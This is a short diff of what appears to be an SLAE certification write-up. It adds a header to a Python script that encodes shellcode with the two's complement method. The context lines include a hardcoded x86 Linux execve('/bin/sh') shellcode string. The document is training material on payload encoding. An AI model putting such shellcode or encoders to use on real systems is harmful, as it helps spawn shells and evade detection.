@@ -61,7 +61,13 @@ The encoding schema created will translate every byte to its two complement byte
 ````
 #!/usr/bin/python
 
-# Two complement encoder
+"""
+ Filename:   two_complement_encoder.py
+ Author:     Samuel Dugo
+ SLAE-ID:    SLAE-1376
+ Purpose:    Assignment #5 of SLAE certification. This code will encode a given shellcode using the two's complement method.
+"""
+
 import random
 
 shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
